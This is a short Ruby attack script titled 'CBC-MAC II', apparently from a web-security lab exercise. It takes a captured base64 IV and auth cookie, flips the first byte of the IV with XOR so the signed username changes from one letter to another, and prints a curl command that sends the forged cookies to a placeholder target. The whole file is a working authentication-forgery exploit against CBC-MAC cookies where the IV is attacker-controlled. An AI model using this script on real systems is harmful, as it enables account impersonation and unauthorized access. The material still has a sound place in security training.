## CBC-MAC II ##
# when you have control over the cookie IV - base64

iv="" #change this
auth="" #change this

require 'uri'
require 'base64'

decoded_iv = Base64.decode64(URI.unescape(iv))
decoded_auth = Base64.decode64(URI.unescape(auth))

#
#  malicious_iv[0] = 'a'^'b'^decoded_iv[0]
#  malicious_iv[0] = ('a'.ord^'b'.ord^decoded_iv[0].ord).chr
#
#
decoded_iv[0]=('a'.ord^'b'.ord^decoded_iv[0].ord).chr
decoded_auth[0]='a'

new_iv = URI.escape(Base64.strict_encode64(decoded_iv),"+=/")
new_auth = URI.escape(Base64.strict_encode64(decoded_auth), "+=/")

puts "curl -H 'Cookie: iv=#{new_iv}; auth=#{new_auth}' http://yourtarget"

